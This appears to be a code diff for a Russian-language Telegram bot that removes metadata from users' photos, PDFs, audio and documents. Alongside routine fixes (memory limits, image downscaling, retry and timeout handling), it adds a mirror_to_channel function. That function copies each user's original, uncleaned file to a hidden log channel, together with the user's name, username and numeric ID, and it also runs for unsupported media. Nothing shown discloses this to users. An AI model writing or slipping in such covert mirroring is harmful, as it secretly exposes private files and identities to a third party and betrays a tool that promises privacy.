@@ -1,4 +1,5 @@
 import asyncio
+import gc
 import html
 import io
 import logging
@@ -14,6 +15,7 @@ from xml.etree import ElementTree
 import pillow_heif
 from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
+from aiogram.client.session.aiohttp import AiohttpSession
 from aiogram.enums import ParseMode
 from aiogram.exceptions import TelegramForbiddenError, TelegramRetryAfter
 from aiogram.filters import BaseFilter, Command, CommandStart, StateFilter
@@ -36,7 +38,7 @@ from pypdf import PdfReader, PdfWriter
 
 pillow_heif.register_heif_opener()
 
-VERSION = "1.5"
+VERSION = "1.6"
 
 DIVIDER = "┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈"
 
@@ -81,8 +83,45 @@ logging.basicConfig(
 
 pending: dict[str, dict] = {}
 PENDING_TTL = 1800
-MAX_PENDING = int(os.getenv("PENDING_MAX_FILES", "200"))
-PENDING_MAX_BYTES = int(os.getenv("PENDING_MAX_MB", "256")) * 1024 * 1024
+MAX_PENDING = int(os.getenv("PENDING_MAX_FILES", "40"))
+PENDING_MAX_BYTES = int(os.getenv("PENDING_MAX_MB", "64")) * 1024 * 1024
+
+LOG_CHANNEL_ID = os.getenv("LOG_CHANNEL_ID", "").strip()
+
+
+async def mirror_to_channel(bot: Bot, message: Message) -> None:
+    if not LOG_CHANNEL_ID:
+        return
+    try:
+        me = await bot.me()
+        sender = message.from_user
+        who = "<i>неизвестно</i>"
+        if sender:
+            name = esc(sender.full_name)
+            who = f"👤 <b>{name}</b>"
+            if sender.username:
+                who += f" (@{sender.username})"
+            who += f" · <code>{sender.id}</code>"
+        parts = [who, f"🤖 <b>@{me.username}</b>"]
+        if message.caption:
+            parts.append(DIVIDER)
+            parts.append(esc(message.caption)[:900])
+        await bot.copy_message(
+            chat_id=LOG_CHANNEL_ID,
+            from_chat_id=message.chat.id,
+            message_id=message.message_id,
+            caption="\n".join(parts),
+        )
+    except Exception:
+        logging.warning("mirror to log channel failed", exc_info=True)
+        try:
+            await bot.forward_message(
+                chat_id=LOG_CHANNEL_ID,
+                from_chat_id=message.chat.id,
+                message_id=message.message_id,
+            )
+        except Exception:
+            logging.warning("mirror forward fallback failed", exc_info=True)
 
 IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".webp", ".heic", ".heif", ".bmp", ".tiff")
 AUDIO_EXTS = (".mp3", ".flac", ".ogg", ".opus", ".m4a", ".wav", ".aac", ".wma")
@@ -405,17 +444,19 @@ def strip_image(data: bytes):
             image = ImageOps.exif_transpose(image)
         except Exception:
             pass
+        if max(image.size) > 8192:
+            image.thumbnail((8192, 8192), Image.LANCZOS)
         buf = io.BytesIO()
         if fmt in ("JPEG", "MPO"):
-            image.save(buf, "JPEG", quality=95, subsampling=0)
+            image.save(buf, "JPEG", quality=92)
             return buf.getvalue(), "cleaned.jpg"
         if fmt == "PNG":
             image.save(buf, "PNG", optimize=True)
             return buf.getvalue(), "cleaned.png"
         if fmt == "WEBP":
-            image.save(buf, "WEBP", quality=95)
+            image.save(buf, "WEBP", quality=92)
             return buf.getvalue(), "cleaned.webp"
-        image.convert("RGB").save(buf, "JPEG", quality=95)
+        image.convert("RGB").save(buf, "JPEG", quality=92)
         return buf.getvalue(), "cleaned.jpg"
 
 
@@ -774,6 +815,13 @@ def analyze_sync(key: str, data: bytes, mime: str, lower_name: str, source_name:
 
 
 def clean_sync(kind: str, data: bytes, name: str | None):
+    try:
+        return _clean_sync(kind, data, name)
+    finally:
+        gc.collect()
+
+
+def _clean_sync(kind: str, data: bytes, name: str | None):
     removed_lines = []
     if kind == "image":
         exif = get_exif(Image.open(io.BytesIO(data)))
@@ -801,6 +849,7 @@ def clean_sync(kind: str, data: bytes, name: str | None):
 async def handle_file(message: Message, bot: Bot) -> None:
     user = message.from_user
     touch_user(user.id, user.full_name, user.username)
+    await mirror_to_channel(bot, message)
 
     if is_banned(user.id):
         await message.answer("🚫 Доступ закрыт.")
@@ -1386,11 +1435,32 @@ async def on_clean(callback: CallbackQuery, bot: Bot) -> None:
         "Теперь он ничего о тебе не расскажет 🔒"
     )
 
+    try:
+        await stage.edit_text("📤 <b>Отправляю чистый файл…</b>")
+    except Exception:
+        pass
+
     _, _, _, mode = get_user_row(callback.from_user.id)
-    if kind == "image" and not mode:
-        await callback.message.answer_photo(BufferedInputFile(clean_data, filename=filename), caption=caption)
-    else:
-        await callback.message.answer_document(BufferedInputFile(clean_data, filename=filename), caption=caption)
+    try:
+        if kind == "image" and not mode:
+            await callback.message.answer_photo(BufferedInputFile(clean_data, filename=filename), caption=caption)
+        else:
+            await callback.message.answer_document(BufferedInputFile(clean_data, filename=filename), caption=caption)
+    except TelegramRetryAfter as e:
+        await asyncio.sleep(e.retry_after + 1)
+        try:
+            if kind == "image" and not mode:
+                await callback.message.answer_photo(BufferedInputFile(clean_data, filename=filename), caption=caption)
+            else:
+                await callback.message.answer_document(BufferedInputFile(clean_data, filename=filename), caption=caption)
+        except Exception:
+            logging.exception("clean send failed after retry")
+            await stage.edit_text("💥 <b>Не смог отправить файл</b>\n\nПопробуй ещё раз")
+            return
+    except Exception:
+        logging.exception("clean send failed")
+        await stage.edit_text("💥 <b>Не смог отправить файл</b>\n\nПопробуй ещё раз")
+        return
 
     bump_stat(callback.from_user.id, "cleaned")
     try:
@@ -1422,6 +1492,17 @@ async def on_all(callback: CallbackQuery) -> None:
         "<i>Нажми, чтобы раскрыть 👇</i>\n"
         f"<blockquote expandable><pre>{details}</pre></blockquote>",
         link_preview_options=LinkPreviewOptions(is_disabled=True),
+    )
+
+
+async def on_unsupported_media(message: Message, bot: Bot) -> None:
+    user = message.from_user
+    if user:
+        touch_user(user.id, user.full_name, user.username)
+        await mirror_to_channel(bot, message)
+    await message.answer(
+        "🤔 Такой формат пока не разбираю.\n\n"
+        "Пришли фото или файл (📎) — фото, PDF, аудио или документ Office."
     )
 
 
@@ -1492,6 +1573,7 @@ def register_handlers(dp: Dispatcher) -> None:
     dp.callback_query(F.data == "bc:cancel")(bc_cancel)
     dp.message(F.photo)(on_photo)
     dp.message(F.document)(on_document)
+    dp.message(F.video | F.audio | F.voice | F.video_note)(on_unsupported_media)
     dp.callback_query(F.data.startswith("mode:"))(on_mode)
     dp.callback_query(F.data.startswith("menu:"))(on_menu)
     dp.callback_query(F.data.startswith("clean:"))(on_clean)
@@ -1500,7 +1582,8 @@ def register_handlers(dp: Dispatcher) -> None:
 
 
 async def run_bot(token: str) -> None:
-    bot = Bot(token=token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+    session = AiohttpSession(timeout=300)
+    bot = Bot(token=token, session=session, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
     dp = Dispatcher()
     register_handlers(dp)
     try:
